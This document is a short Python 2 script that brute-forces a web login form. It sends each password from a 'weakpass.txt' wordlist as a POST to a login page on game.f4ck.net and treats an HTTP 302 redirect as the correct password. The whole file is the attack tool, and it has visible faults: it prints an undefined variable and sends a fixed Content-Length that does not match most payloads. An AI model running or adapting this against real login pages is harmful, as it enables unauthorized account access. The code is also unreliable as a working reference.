__author__ = "ouyang"
__date__ = "2012/01/15"

import httplib
import urllib

if __name__ == "__main__":
	passfile = "weakpass.txt"
	inStream = file(passfile,"r")
	url = 'game.f4ck.net'
	path = "/login2.php"
	full_path = "http://"+url+path
	
	for tmpLine in inStream:
		try:
			data1 = urllib.urlencode({'password':tmpLine.strip('\n'),'log':'denglu'})#change to denglu in chinese
			print data
			conn = httplib.HTTPConnection(url)
			conn.putrequest("POST",'http://'+url+path)
			conn.putheader("Content-Length", "30")
			conn.putheader("Content-Type", "application/x-www-form-urlencoded")
			conn.putheader("Connection", "close")
			conn.endheaders()
			conn.send(data1)
			response = conn.getresponse()
			if response:
				if response.status == 302:
					print "Find the key :"+tmpLine
					response.close() #close response 
					conn.close() #exit will not close connection,so close it     
					break
			conn.close() #this is the key! if not close it,cann't restart next conn 
			print response.status,tmpLine.strip('\n')
		except Exception , e:
			print e
			 
	inStream.close()
